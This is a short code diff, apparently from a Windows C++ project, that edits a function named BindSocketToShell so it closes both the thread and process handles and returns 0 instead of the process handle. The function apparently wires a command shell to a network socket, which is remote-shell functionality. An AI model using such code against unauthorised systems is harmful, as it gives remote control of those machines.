@@ -165,8 +165,9 @@ Result<SSIZE, Error> Process::BindSocketToShell(SSIZE socketFd, const CHAR *cmd)
         return Result<SSIZE, Error>::Err(createResult, Error::Process_BindShellFailed);
     }
 
-    // 2. Close the thread handle to prevent leaks
+    // 2. Close handles to prevent leaks
     (void)NTDLL::ZwClose(pi.hThread);
+    (void)NTDLL::ZwClose(pi.hProcess);
 
-    return Result<SSIZE, Error>::Ok((SSIZE)pi.hProcess);
+    return Result<SSIZE, Error>::Ok(0);
 }
